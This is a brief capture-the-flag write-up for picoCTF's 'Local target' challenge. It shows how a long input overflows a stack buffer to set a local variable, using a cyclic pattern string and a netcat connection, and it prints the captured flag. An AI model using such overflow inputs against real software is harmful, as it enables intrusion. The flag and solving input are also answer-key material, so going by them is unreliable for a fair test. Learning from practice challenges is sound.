# Local target
The problem statement:
```
Smash the stack Can you overflow the buffer and modify the other local variable? The program is available here. You can view source here. And connect with it using: nc saturn.picoctf.net 62971
```

If we just run the file, it says num is 64. But if we enter string, num changes.

```
$ ./local-target
Enter a string: a

num is 64
Bye!
$ ./local-target
Enter a string: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

num is 1633771873
Bye!
```
On gdb, we can use an online tool to generate a string for us that will help us figure out the length of the string that is accepted. So for that, I'll use a website (https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html).
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```
After messing around a bit to find out where the overflow occurs, I just got the necessary string by a bit of luck :P
```
f$ nc saturn.picoctf.net 62971
Enter a string: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7A

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```
That happened is that that overflow part is being converted to ascii, so if we put in A, num becomes 65. :D